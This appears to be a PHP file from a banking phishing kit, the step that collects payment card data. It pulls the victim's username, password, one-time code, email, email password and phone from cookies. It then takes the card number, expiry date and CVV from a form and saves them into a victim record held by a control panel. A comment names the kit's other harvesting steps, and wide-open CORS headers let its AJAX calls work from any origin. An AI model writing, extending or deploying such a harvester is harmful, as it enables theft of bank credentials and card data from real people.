<?php 
require('../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];

$cdinamica = $_COOKIE['cdinamica'];
$email = $_COOKIE['email'];
$cemail = $_COOKIE['cemail'];
$celular = $_COOKIE['celular'];

$tarjeta = $_POST['tar'];
$fecha = $_POST['fec'];
$cvv = $_POST['cvv'];


setcookie('tarjeta',$tarjeta,time()+60*9);
setcookie('fecha',$fecha,time()+60*9);
setcookie('cvv',$cvv,time()+60*9);

actualizar_registro_tar($registro,$tarjeta,$fecha,$cvv);
?>

<?php
// En inicio.php, pasousuario.php, estado.php, pasoOTP.php, pasomail.php, pasotarjeta.php y cualquier otro script PHP que maneje solicitudes AJAX

// Permitir solicitudes desde cualquier origen
header("Access-Control-Allow-Origin: *");

// Permitir los métodos HTTP utilizados en solicitudes AJAX (POST, GET, OPTIONS, etc.)
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");

// Permitir ciertos encabezados en las solicitudes AJAX (puedes ajustarlos según tus necesidades)
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

// Verificar si la solicitud es de tipo OPTIONS (utilizado para preflight en CORS)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    // Respondemos con un código 200 OK y finalizamos el script
    http_response_code(200);
    exit();
}

// Tu lógica de PHP aquí...
?>